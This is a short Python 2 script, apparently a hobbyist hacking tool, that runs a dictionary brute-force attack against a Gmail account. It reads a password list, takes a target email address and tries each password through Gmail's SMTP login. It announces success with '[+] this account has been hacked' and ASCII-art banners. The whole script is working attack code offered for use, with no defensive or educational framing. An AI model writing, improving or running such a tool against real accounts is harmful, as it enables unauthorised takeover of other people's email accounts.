#!/usr/bin/python
'''coded by Goodbye_World'''

import smtplib
from os import system

def main():                                
   print '                             ========================================================'
   print '                             =                    Goodbye_World                     ='
   print '                             ========================================================'                                            
   print '                                    11111100011                                            '
   print '                                   11110011110101                                          ' 
   print '                                  1011101011011100101                                      '
   print '                                010101010011000001010110000100010011111101010              '
   print '                                111011010110100100010101101101100001111010101011           '
   print '                                   010001100100011111111010011100001101        0111        '
   print '                                   1001001100001101111000001111011010000         011       '
   print '                                       010100010101000101011011000100001           10      '
   print '                                         00111010101001111010010000101101           11     '
   print '                                       0011000110010         0111  1011011       01001     '
   print '                                     011110      0110         1001     1111                '
   print '                                      01         111        10101       001                '
   print '                                                0010       11111      11100                '
main()
print '[1] start the brute force attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('enter the path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] this account has been hacked, password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
